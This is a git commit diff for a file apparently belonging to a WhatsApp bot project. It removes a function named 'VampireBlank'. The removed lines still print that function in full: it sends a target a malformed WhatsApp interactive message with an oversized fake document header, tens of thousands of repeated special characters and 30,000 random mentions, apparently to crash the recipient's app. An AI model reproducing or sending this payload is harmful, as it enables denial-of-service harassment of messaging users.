7ec33eecdc68a91f69dae0e8025501b987ea8e91
Haloges <96426178+Hjkku@users.noreply.github.com>
2026-02-07 22:37:36 +0700

    Update functions.js

--- database/functions.js
+++ database/functions.js
@@ -27,52 +27,8 @@ function botInfo() {
 `
 }
 
-
-async function VampireBlank(axiom, target, ptcp = true) {
-  const Vampire = `_*~@8~*_\n`.repeat(10500);
-  const CrashNotif = 'ꦽ'.repeat(55555);
-
-  await axiom.relayMessage(
-    target,
-    {
-      ephemeralMessage: {
-        message: {
-          interactiveMessage: {
-            header: {
-              documentMessage: {
-                url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
-                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
-                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
-                fileLength: "9999999999999",
-                pageCount: 1316134911,
-                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
-                fileName: "𝐕𝐚𝐦𝐩𝐢𝐫𝐞",
-                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
-                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
-                mediaKeyTimestamp: "1726867151",
-              }
-            },
-            body: { text: '𝐕𝐚𝐦𝐩𝐢𝐫𝐞 𝐇𝐞𝐫𝐞' + CrashNotif + Vampire },
-            footer: { text: '' },
-            contextInfo: {
-              mentionedJid: [
-                "0@s.whatsapp.net",
-                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
-              ],
-            },
-          },
-        },
-      },
-    },
-    ptcp ? { participant: { jid: target } } : {}
-  );
-}
-
-module.exports = { VampireBlank }
-
 module.exports = {
     dbFile,
     menuText,
     botInfo,
-    VampireBlank
 }
